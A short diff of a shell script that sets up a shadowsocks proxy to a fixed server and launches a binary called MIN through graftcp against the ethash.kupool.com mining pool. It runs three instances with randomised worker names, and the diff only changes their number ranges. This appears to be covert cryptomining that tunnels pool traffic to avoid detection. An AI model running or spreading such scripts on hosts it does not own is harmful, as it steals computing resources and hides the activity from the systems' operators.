@@ -42,9 +42,9 @@ apt -y install shadowsocks-libev rng-tools
 
 ss-local -s 144.217.7.95 -p 8388 -l 9999 -k rslzw -m chacha20-ietf-poly1305 -v &
 
-./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:8888 --log --extra 
+./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 1-999 -n 1)-MAGIC)@ethash.kupool.com:8888 --log --extra 
 sleep 2
-./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:443 --log --extra 
+./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 10-80 -n 1)-MAGIC)@ethash.kupool.com:443 --log --extra 
 sleep 2
-./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:1800 --log --extra 
+./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 20-188 -n 1)-MAGIC)@ethash.kupool.com:1800 --log --extra 
  
